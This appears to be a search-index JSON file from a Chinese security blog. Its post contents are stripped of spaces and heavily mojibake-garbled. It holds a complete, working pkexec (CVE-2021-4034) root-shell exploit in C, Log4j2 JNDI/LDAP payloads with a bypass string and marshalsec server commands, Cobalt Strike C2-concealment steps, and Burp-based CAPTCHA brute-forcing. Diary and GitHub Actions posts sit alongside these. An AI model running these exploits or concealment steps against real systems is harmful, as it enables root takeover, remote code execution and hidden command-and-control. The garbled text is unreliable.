e=CN|PublicKeytype:rsa|PublicKeybits:2048|SignatureAlgorithm:sha256WithRSAEncryption|Notvalidbefore:2022-02-17T09:06:25|Notvalidafter:2022-05-18T09:06:25|MD5:2d0befaad9423336f561bb5d9e0b9751|_SHA-1:ee5004847d73d8c4fe5d3ef080fe390ca3ed5bcc|_ssl-date:TLSrandomnessdoesnotrepresenttime1x03é‡ç­¾è‡ªæœ‰è¯ä¹¦Cloudflareå¯¼èˆªæ -&gt;SSL/TLS-&gt;æºæœåŠ¡å™¨-&gt;åˆ›å»ºè¯ä¹¦#ç”Ÿæˆp12æ–‡ä»¶opensslpkcs12-export-inpublic.pem-inkeyprivate.key-outdomain-test.p12-namedomain-test.com-passoutpass:123456#ç”Ÿæˆstoreæ–‡ä»¶keytool-importkeystore-deststorepass123456-destkeypass123456-destkeystoredomain-test.store-srckeystoredomain-test.p12-srcstoretypePKCS12-srcstorepass123456-aliasdomain-test.com#ç”Ÿæˆçš„æ–‡ä»¶åå­—å¯ä»¥éšæ„ï¼ŒåŸŸåéœ€å¯¹åº”ä¸Šï¼›å®Œæˆåä¿®æ”¹teamserverä¸­å¯¹åº”çš„storeæ–‡ä»¶ç„¶åå¯åŠ¨ï¼Œè¯ä¹¦å°±æ˜¯Cloudflareç­¾å‘çš„äº†ï¼›ä»¥ä¸Šæ˜¯å‡ ä¸ªå¸¸è§æ­å»ºçš„éšåŒ¿æ€è·¯ï¼Œä¸è¿‡åœ¨ç½‘ç»œæµ‹ç»˜å¹³å°çš„æ— å·®åˆ«æµ‹ç»˜é¢å‰ä»ç„¶å¯ä»¥å¯»å‡ºè››ä¸é©¬è¿¹ï¼Œå‚é˜…ä»¥ä¸‹æ–‡ç« ï¼š1x04ä¿®æ”¹shellcodeåŠ å¯†å¯†é’¥-Markåœ¨CobaltStrikeç‰¹å¾éšè—ä¸€æ–‡ä¸­æåˆ°ï¼šåœ¨cobaltstrikeçš„c2malleableé…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰è‡ªå®šä¹‰http-stagerçš„uriï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œé€šè¿‡è®¿é—®é»˜è®¤çš„uriï¼Œå°±èƒ½è·å–åˆ°csçš„shellcodeã€‚åŠ å¯†shellcodeçš„å¯†é’¥åˆæ˜¯å›ºå®šçš„(3.x0x69ï¼Œ4.x0x2e)ï¼Œæ‰€ä»¥èƒ½ä»shellcodeä¸­è§£å‡ºc2åŸŸåç­‰é…ç½®ä¿¡æ¯ç‚¹å‡»ä»¥æŸ¥çœ‹æ›´å¤šä¸ã€ŒC2æœåŠ¡å™¨éšåŒ¿ã€ç›¸å…³çš„æ–‡ç« å‚è€ƒCobaltStrikeç‰¹å¾éšè—ä¸æµé‡åˆ†æCobaltStrikeç‰¹å¾éšè—PDFSGithubBypasscobaltstrikebeaconconfigscanBypasscobaltstrikebeaconconfigscan"
  },

  {
    "title"    : "Polkit-CVE-2021-4034å¤ç°",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/polkit-CVE-2021-4034/",
    "date"     : "Feb 9, 2022",
    "content"  : "2022-01-25ï¼ŒCVE-2021-4034åˆ©ç”¨è¯¦æƒ…å‘å¸ƒã€‚è¯¥æ¼æ´æ˜¯Qualysç ”ç©¶å›¢é˜Ÿåœ¨polkitçš„pkexecä¸­å‘ç°çš„ä¸€ä¸ªå†…å­˜æŸåæ¼æ´ï¼Œå…è®¸éç‰¹æƒç”¨æˆ·è·å–rootæƒé™ã€‚å½±å“ç‰ˆæœ¬ä¸å½±å“ç‰ˆæœ¬å¤ç°ç¯å¢ƒ$uname-aLinuxubuntu5.8.0-55-generic#62~20.04.1-UbuntuSMPWedJun208:55:04UTC2021x86_64x86_64x86_64GNU/Linux$pkexec--versionpkexecversion0.105ç»“æœEXPæ¥æº/**blasty-vs-pkexec.c--byblasty&lt;peter@haxx.in&gt;*------------------------------------------------*PoCforCVE-2021-4034,shoutouttoQualys**ctfqualityexploit**blablairresponsibledisclosure**--blasty//2022-01-25*/#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/stat.h&gt;#include&lt;sys/types.h&gt;#include&lt;fcntl.h&gt;voidfatal(char*f){perror(f);exit(-1);}voidcompile_so(){FILE*f=fopen(\"payload.c\",\"wb\");if(f==NULL){fatal(\"fopen\");}charso_code[]=\"#include&lt;stdio.h&gt;\\n\"\"#include&lt;stdlib.h&gt;\\n\"\"#include&lt;unistd.h&gt;\\n\"\"voidgconv(){\\n\"\"return;\\n\"\"}\\n\"\"voidgconv_init(){\\n\"\"setuid(0);seteuid(0);setgid(0);setegid(0);\\n\"\"staticchar*a_argv[]={\\\"sh\\\",NULL};\\n\"\"staticchar*a_envp[]={\\\"PATH=/bin:/usr/bin:/sbin\\\",NULL};\\n\"\"execve(\\\"/bin/sh\\\",a_argv,a_envp);\\n\"\"exit(0);\\n\"\"}\\n\";fwrite(so_code,strlen(so_code),1,f);fclose(f);system(\"gcc-opayload.so-shared-fPICpayload.c\");}intmain(intargc,char*argv[]){structstatst;char*a_argv[]={NULL};char*a_envp[]={\"lol\",\"PATH=GCONV_PATH=.\",\"LC_MESSAGES=en_US.UTF-8\",\"XAUTHORITY=../LOL\",\"GIO_USE_VFS=\",NULL};printf(\"[~]compilehelper..\\n\");compile_so();if(stat(\"GCONV_PATH=.\",&amp;st)&lt;0){if(mkdir(\"GCONV_PATH=.\",0777)&lt;0){fatal(\"mkdir\");}intfd=open(\"GCONV_PATH=./lol\",O_CREAT|O_RDWR,0777);if(fd&lt;0){fatal(\"open\");}close(fd);}if(stat(\"lol\",&amp;st)&lt;0){if(mkdir(\"lol\",0777)&lt;0){fatal(\"mkdir\");}FILE*fp=fopen(\"lol/gconv-modules\",\"wb\");if(fp==NULL){fatal(\"fopen\");}fprintf(fp,\"moduleUTF-8//INTERNAL../payload2\\n\");fclose(fp);}printf(\"[~]maybegetshellnow?\\n\");execve(\"/usr/bin/pkexec\",a_argv,a_envp);}ä¿®å¤chmod0755/usr/bin/pkexecæˆ–å‡çº§è‡³ä¸å½±å“ç‰ˆæœ¬========================================================================CentOSï¼šCentOS6ï¼špolkit-0.96-11.el6_10.2CentOS7ï¼špolkit-0.112-26.el7_9.1CentOS8.0ï¼špolkit-0.115-13.el8_5.1CentOS8.2ï¼špolkit-0.115-11.el8_2.2CentOS8.4ï¼špolkit-0.115-11.el8_4.2========================================================================Ubuntuï¼šUbuntu14.04ESMï¼špolicykit-1-0.105-4ubuntu3.14.04.6+esm1Ubuntu16.04ESMï¼špolicykit-1-0.105-14.1ubuntu0.5+esm1Ubuntu18.04LTSï¼špolicykit-1-0.105-20ubuntu0.18.04.6Ubuntu20.04LTSï¼špolicykit-1-0.105-26ubuntu1.2Ubuntu21.10ï¼špolicykit-1-0.105-31ubuntu0.1========================================================================Debainï¼šï¼špolicykit-10.105-18+deb9u2Debainstretchï¼špolicykit-10.105-18+deb9u2Debainbusterï¼špolicykit-10.105-25+deb10u1Debainbullseyeï¼špolicykit-10.105-31+deb11u1Debainbookworm,bullseyeï¼špolicykit-10.105-31.1========================================================================å‚è€ƒpwnkit:LocalPrivilegeEscalationinpolkitâ€™spkexec(CVE-2021-4034)CVE-2021-4034pkexecææƒæ¼æ´åˆ†æLinuxpolkitæƒé™æå‡æ¼æ´ä¿®å¤æ–¹æ³•ï¼ˆCVE-2021-4034ï¼‰ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "Apache Log4J2 RCEå¤ç°å†ç¨‹",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Apache-Log4j2-RCE-WalkThrough/",
    "date"     : "Dec 15, 2021",
    "content"  : "ApacheLog4j-v2.x-xRCEå½±å“ç‰ˆæœ¬ï¼šApacheLog4j2.x&lt;=2.15.0-rc1ApacheLog4j2.x&lt;2.15.0-rc1RCEç¯å¢ƒå‡†å¤‡æ ‡é¢˜ä»“åº“ä¸­demo.jar(æ›´æ¥è¿‘å®é™…æ¸—é€ç¯å¢ƒ)æˆ–è€…ideaä»£ç ç›´æ¥è°ƒè¯•Tips:2021-12-21æ›´æ–°ï¼šåŸä»“åº“ä½œè€…å·²åˆ é™¤ï¼Œæˆ‘è¿™é‡Œä»“åº“é‡æ–°ä¸Šä¼ äº†ä¸€ä»½ï¼Œapache-log4j-poc[apache-log4j-poc]-git:(main)&gt;gitremote-vorigin\thttps://github.com/tangxiaofeng7/apache-log4j-poc.git(fetch)origin\thttps://github.com/tangxiaofeng7/apache-log4j-poc.git(push)å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š@apache-log4j-pocä»“åº“ä¸­çš„æˆªå›¾pocä»£ç ä¸ºç¼ºçœ127.0.0.1ï¼Œæˆ‘æœ¬åœ°å¹¶æœªæˆåŠŸï¼Œéœ€è°ƒæ•´ä¸ºç½‘å¡ç›‘å¬å±€åŸŸç½‘åœ°å€å¦‚192.168.x.xJDKç‰ˆæœ¬11ä»¥ä¸‹ï¼Œæˆ‘çš„æµ‹è¯•ç‰ˆæœ¬å¦‚ä¸‹ï¼š&gt;java-versionjavaversion\"1.8.0_181\"Java(TM)SERuntimeEnvironment(build1.8.0_181-b13)JavaHotSpot(TM)64-BitServerVM(build25.181-b13,mixedmode)åˆ†æç¯å¢ƒæŠŠdemo.jaræ‹‰åˆ°jd-guiä¸­åç¼–è¯‘ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š//com.example.log4j2_rce.Log4j2RceApplication@PostMapping({\"/hello\"})publicStringhello(Stringpayload){System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\");logger.error(\"{}\",payload);logger.info(\"{}\",payload);logger.info(payload);logger.error(payload);return\"ok\";}è®¿é—®è·¯ç”±ä¸ºhelloï¼Œpostpayloadå‚æ•°ï¼›å°è¯•#å¯web$java-jardemo.jar._________/\\\\/___'_____(_)______\\\\\\\\(()\\___|'_|'_||'_\\/_`|\\\\\\\\\\\\/___)||_)|||||||(_||))))'|____|.__|_||_|_||_\\__,|////=========|_|==============|___/=/_/_/_/::SpringBoot::(v2.1.3.RELEASE)ç›´æ¥è®¿é—®åŠ ä¸Špayloadè¿›è¡Œæ”»å‡»ï¼š//$catdnslog.javaimportjava.lang.Runtime;importjava.lang.Process;publicclassdnslog{\tstatic{\t\ttry{\t\tRuntimert=Runtime.getRuntime();\t\tString[]commands={\"open\",\"/System/Applications/Calculator.app\"};\t\tProcesspc=rt.exec(commands);\t\tpc.waitFor();\t\t}catch(Exceptione){\t\t//no\t\t}\t}}//$javacdnslog.java#å¯LDAPæœåŠ¡ï¼š$java-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.LDAPRefServer\"http://192.168.3.64/#dnslog\"#å¯httpï¼š$python3-mhttp.server80ServingHTTPon::port80(http://[::]:80/)...ApacheLog4j2.x&gt;=2.15.0-rc1RCEç¯å¢ƒå‡†å¤‡å¿«é€Ÿå¼€å§‹ï¼šä¿®æ”¹ideaä»£ç ç›´æ¥è°ƒè¯•apache-log4j-pocä»£ç ç‰ˆæœ¬ä¸º&lt;version&gt;2.15.0-rc1&lt;/version&gt;&lt;dependency&gt;&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;&lt;artifactId&gt;log4j-core&lt;/artifactId&gt;&lt;!--&lt;version&gt;2.14.1&lt;/version&gt;--&gt;&lt;version&gt;2.15.0-rc1&lt;/version&gt;&lt;/dependency&gt;&lt;!--https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api--&gt;&lt;dependency&gt;&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;&lt;artifactId&gt;log4j-api&lt;/artifactId&gt;&lt;!--&lt;version&gt;2.14.1&lt;/version&gt;--&gt;&lt;version&gt;2.15.0-rc1&lt;/version&gt;&lt;/dependency&gt;æˆ‘è¿™é‡Œæ˜¯ä¸‹è½½å¥½çš„Log4j2.15.0-rc1ç”¨mavenç¼–è¯‘å¥½åæœ¬åœ°å®‰è£…åˆ°ä»“åº“ï¼Œæ‰€ä»¥ä¸ä¼šæŠ¥é”™ï¼›ç‚¹å‡»è¿™é‡Œäº†è§£æ›´å¤šå…³äºMVNå®‰è£…åˆ°æœ¬åœ°å°è¯•payloadè¿è¡Œæ§åˆ¶å°è¿”å›ï¼š23:05:26.715[main]ERRORlog4j-${jndi:ldap://192.168.3.64:1389/dnslog}ï¼Œè²Œä¼¼å·²ç»ä¿®å¤äº†ï¼›ä½†æ˜¯æˆ‘ä»¬ç»è¿‡æ‰‹åŠ¨æ·»åŠ ä¸€äº›é€‰é¡¹é…ç½®ä»ç„¶æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼šæ·»åŠ src/resources/log4j2.xml&lt;?xmlversion=\"1.0\"encoding=\"UTF-8\"?&gt;&lt;configurationstatus=\"OFF\"monitorInterval=\"30\"&gt;&lt;appenders&gt;&lt;consolename=\"Console\"target=\"SYSTEM_OUT\"&gt;&lt;PatternLayoutpattern=\"%m{lookups}%n\"/&gt;&lt;/console&gt;&lt;/appenders&gt;&lt;loggers&gt;&lt;rootlevel=\"all\"&gt;&lt;appender-refref=\"Console\"/&gt;&lt;/root&gt;&lt;/loggers&gt;&lt;/configuration&gt;&lt;PatternLayoutpattern=\"%m{lookups}%n\"/&gt;å¼€å¯lookupï¼›å°è¯•æ‰“å°infoã€debugä¹‹ç±»çš„ä¿¡æ¯ç¡®å®šé…ç½®æ–‡ä»¶å·²åŠ è½½ï¼›logger.error(\"hello,error\");logger.info(\"hello,info\");logger.debug(\"hello,debug\");#è¾“å‡ºå¦‚ä¸‹ï¼šhello,errorhello,infohello,debugProcessfinishedwithexitcode0Bypassæ”»å‡»payloadï¼š${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}å…·ä½“çš„ç»•è¿‡ä»¥åŠRCEåˆ†æå¯å‚è€ƒRCEå’Œåˆ†æï¼›é™åˆ¶ç›®å‰æš‚æ—¶åªçŸ¥é“jdké«˜ç‰ˆæœ¬ä¼šæŠ¥é”™ï¼š[main]ERRORlog4j-ReferenceClassName:fooè¿™é‡Œæœ¬äººæ²¡æœ‰æµ‹è¯•ï¼Œå¯ä»¥ç§»æ­¥è‡ªè¡Œåˆ†æç‰ˆæœ¬é™åˆ¶bilibili@GCCé…±_0ff1c1a1Log4j2æ¼æ´é£é™©æ¼”ç¤ºä¸ä¸ªäººçœ‹æ³•ï¼Œä¹Ÿæ¬¢è¿è´¡çŒ®æœ¬ä»“åº“ã€‚ä»£ç åŠå‚è€ƒã€å®‰å…¨é€šæŠ¥ã€‘ApacheLog4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´bilibili@GCCé…±_0ff1c1a1Log4j2æ¼æ´é£é™©æ¼”ç¤ºä¸ä¸ªäººçœ‹æ³•ApacheLog4j2ä»RCEåˆ°RC1ç»•è¿‡æµ…è°ˆLog4j2ä¹‹2.15.0ç‰ˆæœ¬RCEç‚¹å‡»è¿™é‡Œäº†è§£æ›´å¤šå…³äºMVNå®‰è£…åˆ°æœ¬åœ°"
  },

  {
    "title"    : "éšä¾¿å†™äº›",
    "category" : "daily",
    "tags"     : "",
    "url"      : "/daily/2021/%E9%9A%8F%E4%BE%BF%E5%86%99%E4%BA%9B/",
    "date"     : "Dec 11, 2021",
    "content"  : "å¯èƒ½æ˜¯ç—…äº†å§ï¼Œæˆ‘æ˜¯ä¸æ„¿å»çœ‹çš„ï¼›å¯¹ç€é‚£å¼ è„¸ï¼Œèƒƒé‡Œæ€»ä¸æ˜¯æ»‹å‘³ï¼Œåƒæ˜¯è¦åå‡ºæ¥ï¼Œä½†ï¼Œæˆ‘æ˜¯ä¸æ•¢çš„ï¼Œåˆæ€•ä¸Šå¤´æ¥äº†æ‰¹ï¼Œè¯´ä»€ä¹ˆï¼šâ€œå¤´ç¿˜å¾—æ¯”å¤©é«˜ï¼Œç›®ä¸­æ— äººã€‚â€ç´¢æ€§å°±ä¸å»ï¼Œè¾äº†èŒã€‚æƒ³æ¥å…¶ä»–äººä¹Ÿå¦‚æˆ‘è¿™èˆ¬å¾—äº†ç—…ï¼Œåªæ˜¯åœ¨å½“èƒƒå¼€å§‹ç¿»æ±Ÿå€’æµ·æ—¶ï¼Œä»–ä»¬å¿ƒé‡Œå´ç†„äº†ç«ã€‚ä»–ä»¬é”™äº†å—ï¼Ÿæ²¡æœ‰ï¼›åªæ˜¯ï¼Œä»–ä»¬æ˜¯ä»–ï¼Œæˆ‘æ˜¯æˆ‘ï¼Œä¸Šçº§æ˜¯ä¸Šçº§ï¼Œå¤§æŠµå¦‚æ­¤ã€‚å¿ƒé‡Œä¸å®‰ï¼Œè¿™å´ä¸åƒæˆ‘ï¼Œç…è´¹è‹¦å¿ƒä¸ºäº†å†™å°è¾å‘ˆä¹ˆï¼›è¿™è®©æˆ‘äº›è®¸çƒ¦èºï¼Œç½¢äº†ï¼Œä½ å°±çœ‹åˆ°è¿™ç½¢ï¼æˆ‘æ‰“å¼€æ‰‹æœºä¸€æŸ¥ï¼Œè¿™æ‰‹æœºæ—¥å†ç«Ÿæ²¡æœ‰å‡æœŸã€‚ç»„é•¿å”§å”§æ­ªæ­ªè¯´ç€ï¼šâ€œå¹´è½»äººï¼å¤šå­¦ä¸€ç‚¹â€ä¹‹ç±»çš„è¯ï¼›æˆ‘æ¨ªç«–ç¡ä¸ç€ï¼Œä»”ç»†æƒ³äº†åŠå¤œï¼Œæ‰ä»è¯éŸ³é‡Œå¬å‡ºæ¥ï¼šåœ¨ç©ºä¸­æ­ªæ­ªæ–œæ–œé£˜ç€å‡ ä¸ªå­—ï¼šç¦»èŒã€‚"
  },

  {
    "title"    : "BurpSuiteéªŒè¯ç æ’ä»¶å®éªŒ",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CAPTCHA-BYPASS-WALKTHROUGH/",
    "date"     : "Nov 23, 2021",
    "content"  : "å¼€å·(juÇn)å¯èƒ½æ˜¯å·äº†å§ï¼Œä»¥å‰çš„æˆ‘çœ‹åˆ°ç™»å½•é¡µé¢æ˜¯ä¸æ„¿IntruderAttackçš„ï¼Œå¿ƒæƒ³ï¼šçˆ†ç ´è¿™æ ·çš„ä½æ•ˆç‡å·¥ä½œï¼Œç‹—éƒ½ä¸å¹²ï¼›ç°åœ¨çœ‹ç€é¡µé¢ä¸Šçš„éªŒè¯ç ï¼Œå¿ƒé‡Œæ€»ä¸æ˜¯æ»‹å‘³ï¼Œå®ƒä¼¼ä¹æ€åº¦ååˆ†å¼ºç¡¬ï¼šä¸å‡†è¿‡ï¼è¯´ç€ä»€ä¹ˆå›¾çµæµ‹è¯•ã€æœºå™¨å­¦ä¹ ä¹‹ç±»çš„èƒ¡è¯ã€‚æƒ³æ¥ï¼Œå…¶ä»–äººä¼°è®¡ä¹Ÿè·Ÿæˆ‘ä¸€æ ·ï¼Œä¸ç„¶ç½‘ä¸Šçš„æŠ€æœ¯å¸–å­æ€ä¹ˆæ„ˆæ¥æ„ˆå¤šä¸”é«˜æ·±äº†å‘¢ï¼›å¤§æŠµè¿™æ¬¡ï¼Œæˆ‘ä»¬çœŸçš„è¦ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šçœ‹è¿™ä¸–ç•Œäº†å§ï¼Ÿå…è´¹çš„éªŒè¯ç çˆ†ç ´æ¥å£ï¼Œå‚ä¸Šï¼šsmxiazi/NEW_xp_CAPTCHA$gitclonehttps://github.com/smxiazi/NEW_xp_CAPTCHA.git$cdNEW_xp_CAPTCHA$python3-mpipinstallmuggle_ocr$python3server.pyStartingserver,listenat:0.0.0.0:8899Attackæ·»åŠ æ‹“å±•ï¼šExtender-&gt;Extentions-&gt;[ADD]-&gt;Type:python.-&gt;${path/to/xp_CAPTCHA.py}ä¸€èˆ¬æ¥è¯´ï¼Œæ˜¯çˆ†ç ´å¯†ç å’ŒéªŒè¯ç ï¼Œæ•…IntruderAttacké…ç½®å¦‚ä¸‹ï¼šå€¼å¾—æ³¨æ„çš„æ˜¯ï¼šæ·»åŠ çš„è¯·æ±‚åŒ…Headerxiapao:http://url/index.php?s=/Admin/Public/verify.htmlä¸ºéªŒè¯ç ç”Ÿæˆé“¾æ¥ï¼›æç¤ºè¿è¡ŒPythonæ‹“å±•éœ€å®‰è£…JpythonJarï¼›ä¸‹è½½2.7.1ç‰ˆæœ¬åŠä»¥ä¸Šçš„ã€‚åœ¨å¼€å§‹çˆ†ç ´å‰ï¼Œè¿˜éœ€åšçš„ä¸€ä»¶äº‹ï¼Œæ˜¯æŠŠéªŒè¯ç payloadçš„ç”Ÿæˆå·¥ä½œäº¤ç»™xp_CAPTCHAï¼›Intruder-&gt;Payloads-&gt;{éªŒè¯ç }{PayloadSet}-&gt;PayloadType:Extension-generated.-&gt;PayloadOptions:SelectGenerator:xp_CAPTCHAè®¾ç½®å•çº¿ç¨‹ï¼ˆNumberofthreads=1ï¼‰ï¼›StartAttackï¼ä¸è¿‡åœ¨å®é™…æ¸—é€ä¸­æ¥çœ‹ï¼Œä½†å‡¡éªŒè¯ç åŠ ä¸€äº›æ··æ·†å­—ç¬¦è¯†åˆ«ç‡å°±ååˆ†ä½ä¸‹ï¼š\\[P_{(success)}=\\frac{18}{1795}*100\\%=0.01\\%\\]"
  },

  {
    "title"    : "ç”¨Github Actionsæœ‰æ„Ÿ",
    "category" : "",
    "tags"     : "ç¬”è®°, Github Actions",
    "url"      : "/blog/2021/Feelings-with-using-Github-Action/",
    "date"     : "Nov 15, 2021",
    "content"  : "äº2022-09-27ä¿®æ”¹è‡ªå¾‹çš„ä»£ç GithubActionsQï¼šå¦‚ä½•è®©æˆ‘ä»¬åœ¨ç½‘ç»œä¸Šï¼ˆGithubï¼‰çœ‹èµ·æ¥å¾ˆå‹¤å¿«/è‡ªå¾‹ï¼ŸAï¼šä½¿ç”¨GithubActionsï¼ˆæ»‘ç¨½ï¼‰on:push:pull_request:schedule:#æ¢ç®—ä¸ºåŒ—äº¬æ—¶é—´ï¼ŒåŠ ä¸Šå…«ä¸ªå°æ—¶-cron:'016**4'###-\"è‡ªå¾‹çš„5è¡Œä»£ç \"##äº2022-09-27ä¿®æ”¹GithubActionsçš„ç®€ä»‹GitHubActionsæ˜¯GitHubçš„æŒç»­é›†æˆæœåŠ¡ï¼Œäº2018å¹´10æœˆæ¨å‡ºã€‚æ‘˜äºGitHubActionså…¥é—¨æ•™ç¨‹æˆ‘æ›´æ„¿æ„æŠŠå¥¹å«åšPaas(å¹³å°æœåŠ¡)ï¼›ä¸ºä»€ä¹ˆï¼Ÿè°ˆè°ˆæˆ‘æœ€è¿‘è¿™æ®µæ—¶é—´ä½¿ç”¨çš„çœ‹æ³•ï¼šä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼šæˆ‘ä»¬åœ¨å®¶é‡Œæ€ä¹ˆåšå‡ºä¸€å—é¢åŒ…ï¼Ÿ1.é‡‡è´­é¢åŒ…åŸææ–™ï¼›2.ç¡®å®šé¢åŒ…çš„å¤–å½¢ã€å£å‘³ï¼›3.æ‰‹åŠ¨åŠ å·¥åŸææ–™ï¼›4.çƒ˜ç„™æˆå‹ã€‚é‚£ä¹ˆä¸€ä¸ªé¢åŒ…Actionsæ˜¯æ€ä¹ˆæ ·çš„å‘¢ï¼Ÿæˆ‘ä»¬åªéœ€è¦äººä¸ºè´Ÿè´£1ã€2ä¸¤æ­¥ï¼Œè€Œ3ã€4æ­¥æ€ä¹ˆåŠï¼Ÿäººç±»çš„æ™ºæ…§æ€»æ˜¯æ— é™ï¼Œæˆ‘ä»¬ç¡®å®šåŸºæœ¬é‡å¤æµç¨‹åâ€œæ•™ä¼šâ€æœºå™¨ï¼Œè®©æœºå™¨æ¥å®Œæˆï¼›è€Œæˆ‘ä»¬æŠŠç²¾åŠ›æ”¾åœ¨åŸææ–™çš„è´¨é‡ä¸Šå’Œé¢åŒ…å¤–å½¢å’Œå£å‘³ï¼›è¿™å°±æ˜¯å·¥å‚ï¼›æ¥è°ˆè°ˆActionï¼Œå‡è®¾æˆ‘ä»¬å®šä¹‰ï¼šåœ¨è½¯ä»¶ç”Ÿäº§å‘¨æœŸå†…ï¼Œä¸æ¶‰åŠåˆ°éœ€æ±‚æ–¹å‘ï¼Œåªè€ƒè™‘ä»£ç ä½œä¸šï¼›ä¸ºäº†æ–¹ä¾¿å™è¿°æˆ‘ç®€åŒ–æµç¨‹ï¼šé‚£ä¹ˆä»ç¼–è¾‘ä»£ç ã€è¿è¡Œè°ƒè¯•ä»£ç åˆ°æœ€åçš„ä¸Šçº¿ä»£ç ï¼Œåœ¨æŸç§ç¨‹åº¦ä¸Šæ¥çœ‹å®é™…ä¸Šåªæœ‰ç¬¬ä¸€ä¸ªæµç¨‹æ˜¯å’Œæˆ‘ä»¬æ¯æ¯ç›¸å…³ã€å…³è”åº¦æé«˜çš„ï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰å„ç§æ ¹æ®éœ€æ±‚æ¥ä¸ªæ€§åŒ–å®šåˆ¶çš„ä»£ç ã€æ¥å£ã€å‡½æ•°ï¼Œåé¢çš„ä¸¤ä¸ªæµç¨‹ä»ä¸€å®šæ„ä¹‰ä¸Šæ¥çœ‹ï¼Œå±äºï¼šæµæ°´çº¿ä½œä¸šï¼›å˜¿!æŠŠç¯å¢ƒæ­å»ºå’Œæ¯ç‡¥çš„ç¯å¢ƒå˜é‡äº¤ç»™æœºå™¨å§!!!è¿™ï¼Œæ˜¯ä»€ä¹ˆï¼Ÿå¹³å°ã€‚é—²è°ˆæ·»åŠ äº2022/02/24/14:31:54æœ€è¿‘åœ¨å¿™ä¸€äº›å…¶ä»–çš„äº‹æƒ…ï¼Œblogæ²¡æœ‰æ›´æ–°å¤ªå¤šï¼›çªå‘å¥‡æƒ³å¯¹Aboutæ å·¦ä¾§æŒ‰ç…§æ—¶é—´å¹¶ç”Ÿæˆç½—é©¬æ•°å­—è¿›è¡Œæ’åºå®ç°æ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œjekyllå·²ç»å®šä¹‰äº†å¾ˆå¤šæ ‡ç­¾ç»™æˆ‘ä»¬è°ƒç”¨ï¼›åœ¨forå¾ªç¯é‡Œç›´æ¥è°ƒç”¨{{forloop.index}}æ•°ç»„å³å¯ç›´æ¥æ‰“å°å‡ºå¯¹åº”æ–‡ç« çš„æ•°å­—åºå·ï¼Œç„¶åè½¬æˆç½—é©¬æ•°å­—äºæ˜¯ä¹åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†jekyllæ’ä»¶å½¢å¦‚ä¸‹å¯ä»¥ç›´æ¥è½¬åŒ–ï¼š{{forloop.index|roman}}ä¸è¿‡ä½¿ç”¨jekyll-romanæ’ä»¶åæœ¬åœ°é¢„è§ˆå´ä¸€ç›´æŠ¥é”™ï¼Œç„¶è€Œæœ¬åœ°Gemfileæ ¹æ®å®˜æ–¹æ–‡æ¡£ç»™çš„ä¾èµ–æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼šjekyll-roman0.0.3jekyll-toc0.17.1jekyll-toc(Jekyll::Errors::MissingDependencyException)jekyll-roman(Jekyll::Errors::MissingDependencyException)è¿™ä¸¤ä¸ªæ’ä»¶æ¥å›æŠ¥é”™ï¼Œäºæ˜¯ä¹æˆ‘èŠ±äº†ä¸€æ™šä¸Šæ—¶é—´ã€åˆ é™¤äº†æ‰€æœ‰gemä¾èµ–æ¥æ’é”™ï¼›æœ€åå‘ç°jekyll-romanè¿™ä¸ªæ’ä»¶åªæœ‰0.0.1ç‰ˆæœ¬å¯ç”¨ï¼Œç„¶åä¸Šé¢çš„Gemä¾èµ–ä¼ ä¸Šactionä¹Ÿæ²¡é—®é¢˜ï¼Œå•çº¯çš„ç‰ˆæœ¬é—®é¢˜ï¼›åæ§½ä¸€ä¸‹ä½œè€…:DGithubActionsçš„ä½œç”¨åä¸€æœˆä»½å¯¹æˆ‘æ¥è¯´æ˜¯ç—´è¿·Actionçš„ä¸€ä¸ªæœˆï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢çš„å›¾ï¼Œæ•´ä¸ªåä¸€æœˆæŒ‰æ¯å¤©ç®—ï¼Œå•å¤©æˆ‘æœ€å¤šæäº¤äº†146æ¬¡åŒ…æ‹¬è°ƒè¯•ã€æ„å»ºåœ¨å†…çš„ä»£ç ï¼šGithubActionæä¾›GithubæœåŠ¡å™¨æ‰˜ç®¡çš„è™šæ‹ŸæœºåŒ…æ‹¬Linuxã€Windowsä»¥åŠmacOSï¼Œæ”¯æŒå¾ˆå¤šç¯å¢ƒï¼Œæ‚¨å¯ä»¥ç§»æ­¥docså¿«é€Ÿå¼€å§‹è¿˜æœ‰ä¸€äº›ç›¸å…³çš„åŸºæœ¬æ¦‚å¿µã€æ–‡ä»¶ç›¸å…³ï¼Œæˆ‘å°±ä¸æ¬è¿äº†ï¼Œå¯ä»¥ç§»æ­¥å¼€å¤´çš„å…¥é—¨æ•™ç¨‹æŸ¥çœ‹ç›¸å…³æ–‡ç« 